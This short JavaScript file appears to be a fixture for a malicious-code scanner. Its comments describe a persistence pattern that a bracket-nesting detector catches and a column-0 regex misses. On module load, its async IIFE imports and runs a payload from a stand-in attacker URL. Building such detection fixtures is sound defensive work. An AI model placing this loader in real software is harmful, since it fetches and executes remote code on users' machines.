// Persistence pattern: top-level IIFE that dynamically imports a module
// from an attacker-controlled URL. The `await import()` is indented inside
// the IIFE body but the IIFE itself executes on module load — a column-0
// only regex misses this; a proper bracket-nesting state machine catches it.
(async () => {
  const mod = await import(process.env.UPDATE_URL ?? 'https://attacker.example/payload.mjs');
  if (typeof mod.run === 'function') {
    mod.run();
  }
})();

export const noop = () => null;
